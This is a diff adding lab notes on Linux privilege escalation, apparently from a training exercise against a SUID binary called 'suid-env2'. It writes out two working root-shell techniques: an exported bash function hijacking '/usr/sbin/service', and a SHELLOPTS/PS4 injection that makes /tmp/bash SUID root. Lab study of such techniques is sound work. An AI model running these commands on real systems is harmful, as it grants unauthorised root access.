@@ -70,6 +70,32 @@ EXPLOITATION
 A. 1st Exploitation
 ===================
 
+(a) In command prompt of target:
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+
+(b)in command prompt of target export the newly created function:
+export -f /usr/sbin/service
+
+(c) Now run the target suid binary
+
+/usr/local/bin/suid-env2
+
+We will get the root shell.
+
+B. 2nd Exploitation
+===================
+
+(a) in target's command prompt:
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
+
+got the root shell.
+
+NOTE:
+The env command allows you to display your current environment or run a specified command in a changed environment
+ It can print a list of the current environment variables, or to run another program in a custom environment without modifying the current one
+ 
+ env -i =>ignore environment
+ 
 
 
 
